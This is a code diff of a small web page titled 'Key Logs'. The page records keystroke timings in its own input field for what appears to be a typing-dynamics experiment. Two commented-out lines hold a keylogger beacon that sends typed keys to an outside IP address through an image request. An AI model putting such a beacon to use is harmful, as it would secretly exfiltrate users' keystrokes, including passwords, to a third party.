@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -7,15 +9,13 @@
 
 	<h1>Key Logs</h1>
 
-	<input type="password" id = "text">&nbsp &nbsp &nbsp &nbsp &nbsp <button type = "Submit" onclick="getArray()">Submit</button>
+	<input type="text" id = "text">&nbsp&nbsp &nbsp &nbsp &nbsp <button type = "submit" id = "submit">Submit</button>
 	<p id="demo"></p>
 
 <script>
-
-var buffer = [];
+var buffer = [], final = [], logs = [];
 var oldstroke = new Object();
 var newstroke = new Object();
-
 document.getElementById("text").onkeydown = function(e) {
 	//var keys='';
 	//get = window.event?event:e;
@@ -23,12 +23,10 @@ document.getElementById("text").onkeydown = function(e) {
 	//key = String.fromCharCode(key);
 	//keys+=key;
 	//alert("function");
-
 	var timestamp = Date.now() | 0;
     var stroke = {
         key: e.key,
         time: timestamp
-
     };
     //var data = encodeURIComponent(JSON.stringify(buffer));
     if(stroke["key"] == "Backspace")
@@ -36,26 +34,14 @@ document.getElementById("text").onkeydown = function(e) {
     	buffer = [];
     	document.getElementById("text").value = "";
     }
-
     else if(stroke["key"] != "Shift"){
-    	/*if(stroke["key"] != newstroke.key){
-    		var newdown = stroke;
-    		var olddown = newtsroke;
-    		var time = olddown.time - newdown.time;
-
-    		oldstroke.time = newstroke.time - ;
-
-    	}*/
     	buffer.push(stroke);
     }
-
 	window.setInterval(function(){
 	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
 		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
 	}, 1000);
 }
-
-
 document.getElementById("text").onkeyup = function(e) {
 	//var keys='';
 	//get = window.event?event:e;
@@ -68,9 +54,7 @@ document.getElementById("text").onkeyup = function(e) {
         key: e.key,
         time: timestamp
     };
-
     //var data = encodeURIComponent(JSON.stringify(buffer));
-
     if(stroke["key"] == "Backspace")
     {
     	buffer = [];
@@ -80,13 +64,66 @@ document.getElementById("text").onkeyup = function(e) {
     {
     	buffer.push(stroke);
     }
-
 	window.setInterval(function(){
 	//new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
 		document.getElementById("demo").innerHTML = JSON.stringify(buffer);
 	}, 1000);
 }
+document.getElementById("submit").onclick = function(e){
+    var up = {key:'@', time:0}, down = {key:'#', time:0};
+    console.log(JSON.stringify(buffer));
+    var c = 0,i = 0,k = 0;
+    while(buffer.length>0){
+        j = 0;
+        c = 0;
+        down = buffer.shift();
+        while(c!= 1 && j<buffer.length){
+            if(buffer[j].key == down.key){
+                var temp = buffer.splice(j,1);
+                console.log(JSON.stringify(temp) + "  temp\n");
+                up = temp[0];
+                c = 1;
+            }
+            j++;
+        }
+        final.push(down);
+        if(c == 1){
+    		final.push(up);
+    	}
+
+        console.log(JSON.stringify(final) + "final");
+        /*if(j! = 0){
+            if(final[j].keyDownTime >= final[j-1].keyUpTime){
+                final[j].flightTime = 0;
+                final[j-1].keyPressTime = final[j-1].keyDownTime - finla[j].keyDownTime;
+            }
+            else
+                final[j]
+        }*/
+    }
+    //createlog();
+}
+
+/*function createlog(){
+	var i = 0;
+	for(i = 0 ; i<final.length ; i+=2){
+		var keypressed = {
+			key:final[i].key,
+			keyPressTime: Math.abs(final[i].time - final[i+1].time),
+			keyFlightTime:0
+		};
+		if(i<final-length-1 && final[i+1].time >= final[i+2].time)
+			keypressed.keyFlightTime = 0;
+		else
+			keypressed.keyFlightTime = Math.abs(final[i+2].time - final[i+1].time);
+		console.log(keypressed + "\n");
+
+		logs.push(keypressed);
+	}
+	console.log(JSON.stringify(logs));
+}*/
 
 </script>
 </body>
 </html>
+
